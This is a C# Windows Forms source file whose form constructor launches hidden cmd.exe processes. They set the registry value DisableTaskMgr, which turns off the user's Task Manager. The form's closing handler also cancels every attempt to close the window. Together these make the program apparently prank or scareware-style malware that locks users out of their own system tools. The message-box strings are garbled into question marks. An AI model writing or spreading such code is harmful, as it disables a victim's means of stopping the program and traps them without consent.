using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace AAA
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            ProcessStartInfo cmd = new ProcessStartInfo();
            cmd.FileName = "cmd.exe";
            cmd.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.Arguments = @"/c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1";
            ProcessStartInfo cmd2 = new ProcessStartInfo();
            cmd2.FileName = "cmd.exe";
            cmd2.WindowStyle = ProcessWindowStyle.Hidden;
            cmd2.Arguments = @"/c REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
            Process.Start(cmd2);
            Process.Start(cmd);
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        { 
            MessageBox.Show("???????????" + this.textBox1.Text + "???????????????" + this.textBox2.Text, "????????????", MessageBoxButtons.OK);
        }


        private void process1_Exited(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("???????????");
        }
    }
}
